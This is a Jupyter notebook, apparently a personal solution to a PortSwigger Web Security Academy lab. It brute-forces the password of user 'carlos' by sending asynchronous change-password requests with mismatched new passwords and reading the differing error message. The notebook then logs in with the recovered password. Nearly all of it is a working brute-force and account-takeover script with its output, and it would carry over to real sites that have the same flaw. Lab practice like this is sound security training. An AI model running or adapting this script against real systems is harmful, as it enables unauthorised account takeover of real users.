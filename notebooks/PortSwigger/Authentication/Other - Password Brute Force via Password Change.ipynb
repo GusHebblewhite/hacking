{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "56fd8973",
   "metadata": {},
   "source": [
    "# Other - Password Brute-Force via Password Change\n",
    "[See lab here](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)\n",
    "\n",
    "Me: `wiener:peter`\\\n",
    "Target: `carlos`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "c81685f8",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import asyncio\n",
    "import aiohttp\n",
    "import tqdm.notebook as tq\n",
    "\n",
    "#Important for jupyter\n",
    "import nest_asyncio\n",
    "nest_asyncio.apply()\n",
    "\n",
    "from load_un_pw import get_un_pw"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "4cbae31a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c7527ee6b7b0484ead577a0bdbf615d7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/100 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "URL = \"https://ac811f6c1f957141c00ac648003a0092.web-security-academy.net/\"\n",
    "\n",
    "_, passwords = get_un_pw()\n",
    "\n",
    "target_uname = \"carlos\"\n",
    "my_data = {\"username\" : \"wiener\", \"password\" : \"peter\"}\n",
    "\n",
    "#Log in as myself to grab a valid session cookie\n",
    "s = requests.session()\n",
    "r = s.post(URL + \"login\", data=my_data)\n",
    "session_cookie = s.cookies.get_dict()\n",
    "\n",
    "#Lets just try to submit the \"change password\" request over and over with carlos' username,\n",
    "#iterating through all passwordsb\n",
    "\n",
    "#https://acd11f521f5e2f3ac0d53bee00d3004c.web-security-academy.net/my-account/change-password\n",
    "\n",
    "async def reset_pw(session, old_pw):\n",
    "    async with session.post(\n",
    "        URL + \"my-account/change-password\", \n",
    "        data = {\"username\" : target_uname, \n",
    "                \"current-password\" : old_pw,\n",
    "                \"new-password-1\" : \"a\", \n",
    "                \"new-password-2\" : \"b\"}\n",
    "        ) as response:\n",
    "        return [old_pw, await response.text()]\n",
    "    \n",
    "async def brute_force_pw_change():\n",
    "    async with aiohttp.ClientSession(cookies = session_cookie) as session:\n",
    "        tasks = [reset_pw(session, x) for x in passwords]\n",
    "        \n",
    "        return [await f for f in tq.tqdm(asyncio.as_completed(tasks), total=len(tasks))]\n",
    "        \n",
    "result = asyncio.run(brute_force_pw_change())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "54e966db",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'thomas'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "target_pw = [x[0] for x in result if \"New passwords do not match\" in x[1]][0]\n",
    "target_pw"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "984a023f",
   "metadata": {},
   "source": [
    "Ok so now we have the password. Let's log in to finish the lab"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "507b003e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r = requests.post(URL + \"login\", data = {\"username\" : target_uname, \"password\" : target_pw})\n",
    "r"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
